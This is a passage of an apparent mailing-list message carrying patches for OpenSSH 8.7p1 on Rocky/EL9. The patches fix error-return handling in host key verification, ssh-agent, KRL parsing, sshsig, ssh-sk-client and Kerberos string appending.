++		r = -1;
+ 		goto out;
+ 	}
+ 	e->session_ids = xrecallocarray(e->session_ids, e->nsession_ids,
+diff --git a/ssh-sk-client.c b/ssh-sk-client.c
+index c00c633..27d27a2 100644
+--- a/ssh-sk-client.c
++++ b/ssh-sk-client.c
+@@ -429,6 +429,7 @@ sshsk_load_resident(const char *provider_path, const char *device,
+ 		}
+ 		if ((srk = calloc(1, sizeof(*srk))) == NULL) {
+ 			error_f("calloc failed");
++			r = SSH_ERR_ALLOC_FAIL;
+ 			goto out;
+ 		}
+ 		srk->key = key;
+@@ -440,6 +441,7 @@ sshsk_load_resident(const char *provider_path, const char *device,
+ 		if ((tmp = recallocarray(srks, nsrks, nsrks + 1,
+ 		    sizeof(*srks))) == NULL) {
+ 			error_f("recallocarray keys failed");
++			r = SSH_ERR_ALLOC_FAIL;
+ 			goto out;
+ 		}
+ 		debug_f("srks[%zu]: %s %s uidlen %zu", nsrks,
+diff --git a/sshconnect2.c b/sshconnect2.c
+index 9940833..9751b68 100644
+--- a/sshconnect2.c
++++ b/sshconnect2.c
+@@ -94,7 +94,7 @@ verify_host_key_callback(struct sshkey *hostkey, struct ssh *ssh)
+ 	    options.required_rsa_size)) != 0)
+ 		fatal_r(r, "Bad server host key");
+ 	if (verify_host_key(xxx_host, xxx_hostaddr, hostkey,
+-	    xxx_conn_info) == -1)
++	    xxx_conn_info) != 0)
+ 		fatal("Host key verification failed.");
+ 	return 0;
+ }
+@@ -692,6 +692,7 @@ input_userauth_pk_ok(int type, u_int32_t seq, struct ssh *ssh)
+ 
+ 	if ((pktype = sshkey_type_from_name(pkalg)) == KEY_UNSPEC) {
+ 		debug_f("server sent unknown pkalg %s", pkalg);
++		r = SSH_ERR_INVALID_FORMAT;
+ 		goto done;
+ 	}
+ 	if ((r = sshkey_from_blob(pkblob, blen, &key)) != 0) {
+@@ -702,6 +703,7 @@ input_userauth_pk_ok(int type, u_int32_t seq, struct ssh *ssh)
+ 		error("input_userauth_pk_ok: type mismatch "
+ 		    "for decoded key (received %d, expected %d)",
+ 		    key->type, pktype);
++		r = SSH_ERR_INVALID_FORMAT;
+ 		goto done;
+ 	}
+ 
+@@ -721,6 +723,7 @@ input_userauth_pk_ok(int type, u_int32_t seq, struct ssh *ssh)
+ 		    SSH_FP_DEFAULT);
+ 		error_f("server replied with unknown key: %s %s",
+ 		    sshkey_type(key), fp == NULL ? "<ERROR>" : fp);
++		r = SSH_ERR_INVALID_FORMAT;
+ 		goto done;
+ 	}
+ 	ident = format_identity(id);
+diff --git a/sshsig.c b/sshsig.c
+index 72bbf73..a88e939 100644
+--- a/sshsig.c
++++ b/sshsig.c
+@@ -877,6 +877,7 @@ cert_filter_principals(const char *path, u_long linenum,
+ 	}
+ 	if ((principals = sshbuf_dup_string(nprincipals)) == NULL) {
+ 		error_f("buffer error");
++		r = SSH_ERR_ALLOC_FAIL;
+ 		goto out;
+ 	}
+ 	/* success */
+
+--fdj2RfSjLxBAspz7
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="openssh-8.7p1-upstream-rocky-retval.patch"
+
+diff -urp openssh-8.7p1-43.el9-tree.orig/krl.c openssh-8.7p1-43.el9-tree.qualys-retval/krl.c
+--- openssh-8.7p1-43.el9-tree.orig/krl.c	2025-02-14 00:31:18.634510910 +0000
++++ openssh-8.7p1-43.el9-tree.qualys-retval/krl.c	2025-02-21 02:48:23.080972135 +0000
+@@ -674,6 +674,7 @@ revoked_certs_generate(struct revoked_ce
+ 			break;
+ 		case KRL_SECTION_CERT_SERIAL_BITMAP:
+ 			if (rs->lo - bitmap_start > INT_MAX) {
++				r = SSH_ERR_INVALID_FORMAT;
+ 				error_f("insane bitmap gap");
+ 				goto out;
+ 			}
+@@ -1008,6 +1009,7 @@ ssh_krl_from_blob(struct sshbuf *buf, st
+ 		goto out;
+ 
+ 	if ((krl = ssh_krl_init()) == NULL) {
++		r = SSH_ERR_ALLOC_FAIL;
+ 		error_f("alloc failed");
+ 		goto out;
+ 	}
+diff -urp openssh-8.7p1-43.el9-tree.orig/ssh-agent.c openssh-8.7p1-43.el9-tree.qualys-retval/ssh-agent.c
+--- openssh-8.7p1-43.el9-tree.orig/ssh-agent.c	2025-02-14 00:31:18.653510894 +0000
++++ openssh-8.7p1-43.el9-tree.qualys-retval/ssh-agent.c	2025-02-21 04:01:32.677160367 +0000
+@@ -700,6 +700,8 @@ process_add_identity(SocketEntry *e)
+ 	if ((r = sshkey_private_deserialize(e->request, &k)) != 0 ||
+ 	    k == NULL ||
+ 	    (r = sshbuf_get_cstring(e->request, &comment, NULL)) != 0) {
++		if (!r) /* k == NULL */
++			r = SSH_ERR_INTERNAL_ERROR;
+ 		error_fr(r, "parse");
+ 		goto out;
+ 	}
+diff -urp openssh-8.7p1-43.el9-tree.orig/sshconnect2.c openssh-8.7p1-43.el9-tree.qualys-retval/sshconnect2.c
+--- openssh-8.7p1-43.el9-tree.orig/sshconnect2.c	2025-02-14 00:31:18.743510817 +0000
++++ openssh-8.7p1-43.el9-tree.qualys-retval/sshconnect2.c	2025-02-21 02:48:30.464965775 +0000
+@@ -102,7 +102,7 @@ verify_host_key_callback(struct sshkey *
+ 	    options.required_rsa_size)) != 0)
+ 		fatal_r(r, "Bad server host key");
+ 	if (verify_host_key(xxx_host, xxx_hostaddr, hostkey,
+-	    xxx_conn_info) == -1)
++	    xxx_conn_info) != 0)
+ 		fatal("Host key verification failed.");
+ 	return 0;
+ }
+@@ -811,6 +811,7 @@ input_userauth_pk_ok(int type, u_int32_t
+ 
+ 	if ((pktype = sshkey_type_from_name(pkalg)) == KEY_UNSPEC) {
+ 		debug_f("server sent unknown pkalg %s", pkalg);
++		r = SSH_ERR_INVALID_FORMAT;
+ 		goto done;
+ 	}
+ 	if ((r = sshkey_from_blob(pkblob, blen, &key)) != 0) {
+@@ -821,6 +822,7 @@ input_userauth_pk_ok(int type, u_int32_t
+ 		error("input_userauth_pk_ok: type mismatch "
+ 		    "for decoded key (received %d, expected %d)",
+ 		    key->type, pktype);
++		r = SSH_ERR_INVALID_FORMAT;
+ 		goto done;
+ 	}
+ 
+@@ -840,6 +842,7 @@ input_userauth_pk_ok(int type, u_int32_t
+ 		    SSH_FP_DEFAULT);
+ 		error_f("server replied with unknown key: %s %s",
+ 		    sshkey_type(key), fp == NULL ? "<ERROR>" : fp);
++		r = SSH_ERR_INVALID_FORMAT;
+ 		goto done;
+ 	}
+ 	ident = format_identity(id);
+diff -urp openssh-8.7p1-43.el9-tree.orig/sshsig.c openssh-8.7p1-43.el9-tree.qualys-retval/sshsig.c
+--- openssh-8.7p1-43.el9-tree.orig/sshsig.c	2025-02-14 00:31:18.658510889 +0000
++++ openssh-8.7p1-43.el9-tree.qualys-retval/sshsig.c	2025-02-21 02:48:30.465965774 +0000
+@@ -971,6 +971,7 @@ cert_filter_principals(const char *path,
+ 	}
+ 	if ((principals = sshbuf_dup_string(nprincipals)) == NULL) {
+ 		error_f("buffer error");
++		r = SSH_ERR_ALLOC_FAIL;
+ 		goto out;
+ 	}
+ 	/* success */
+diff -urp openssh-8.7p1-43.el9-tree.orig/ssh-sk-client.c openssh-8.7p1-43.el9-tree.qualys-retval/ssh-sk-client.c
+--- openssh-8.7p1-43.el9-tree.orig/ssh-sk-client.c	2021-08-20 04:03:49.000000000 +0000
++++ openssh-8.7p1-43.el9-tree.qualys-retval/ssh-sk-client.c	2025-02-21 02:48:30.462965777 +0000
+@@ -419,6 +419,7 @@ sshsk_load_resident(const char *provider
+ 		if ((tmp = recallocarray(keys, nkeys, nkeys + 1,
+ 		    sizeof(*keys))) == NULL) {
+ 			error_f("recallocarray keys failed");
++			r = SSH_ERR_ALLOC_FAIL;
+ 			goto out;
+ 		}
+ 		debug_f("keys[%zu]: %s %s", nkeys, sshkey_type(key),
+
+--fdj2RfSjLxBAspz7
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="openssh-8.7p1-rocky-krb5-ssh_asprintf_append.patch"
+
+diff -urp openssh-8.7p1-43.el9-tree.orig/auth-krb5.c openssh-8.7p1-43.el9-tree.krb5-ssh_asprintf_append/auth-krb5.c
+--- openssh-8.7p1-43.el9-tree.orig/auth-krb5.c	2025-02-14 00:31:18.629510914 +0000
++++ openssh-8.7p1-43.el9-tree.krb5-ssh_asprintf_append/auth-krb5.c	2025-02-21 03:37:13.106465704 +0000
+@@ -309,13 +309,14 @@ ssh_asprintf_append(char **dsc, const ch
+ 	i = vasprintf(&src, fmt, ap);
+ 	va_end(ap);
+ 
+-	if (i == -1 || src == NULL)
++	if (i == -1)
+ 		return -1;
+ 
+ 	old = *dsc;
+ 
+ 	i = asprintf(dsc, "%s%s", *dsc, src);
+-	if (i == -1 || src == NULL) {
++	if (i == -1) {
++		*dsc = old;
+ 		free(src);
+ 		return -1;
+ 	}
+
+--fdj2RfSjLxBAspz7--
